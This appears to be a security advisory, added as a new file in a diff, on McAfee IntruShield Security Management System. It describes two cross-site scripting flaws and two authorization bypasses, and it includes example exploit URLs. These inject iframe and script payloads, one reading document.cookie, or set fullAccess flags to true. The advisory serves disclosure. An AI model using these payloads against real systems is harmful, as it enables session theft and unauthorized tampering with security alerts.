@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/14167/info
+
+McAfee IntruShield Security Management System is susceptible to multiple vulnerabilities.
+
+The first two issues are cross-site scripting vulnerabilities in the 'intruvert/jsp/systemHealth/SystemEvent.jsp' script. These issues are due to a failure of the application to properly sanitize user-supplied data prior to utilizing it in dynamically generated HTML.
+
+The next two issues are authorization bypass vulnerabilities leading to information disclosure and the ability to acknowledge, de-acknowledge, and delete security alerts.
+
+These vulnerabilities require a valid user account in the affected application. 
+
+https://www.example.com/intruvert/jsp/systemHealth/SystemEvent.jsp?fullAccess=false&faultResourceName=Manager&domainName=%2FDemo%3A0&resourceName=%2FDemo%3A0%2FManager&resourceType=Manager&topMenuName=SystemHealthManager&secondMenuName=Faults&resourceId=-1&thirdMenuName=<iframe%20src="http://www.example2.com/"%20width=800%20height=600></iframe>&severity=critical&count=1
+https://www.example.com/intruvert/jsp/systemHealth/SystemEvent.jsp?fullAccess=false&faultResourceName=Manager&domainName=Demo&resourceName=<script>alert("trouble_ahead")</script><script>alert(document.cookie)</script>&resourceType=Manager&topMenuName=SystemHealthManager&secondMenuName=Faults&resourceId=-1&thirdMenuName=Critical&severity=critical&count=1
+
+Example URIs for the authentication bypass vulnerabilities:
+https://www.example.com:443/intruvert/jsp/reports/reports-column-center.jsp?monitoredDomain=%2FDemo&selectedDomain=0&fullAccessRight=true
+https://www.example.com/intruvert/jsp/systemHealth/SystemEvent.jsp?fullAccess=true&faultResourceName=Manager&domainName=%2FDemo%3A0&resourceName=%Demo%3A0%2FManager&resourceType=Manager&topMenuName=SystemHealthManager&secondMenuName=Faults&resourceId=-1&thirdMenuName=Critical&severity=critical&count=1 
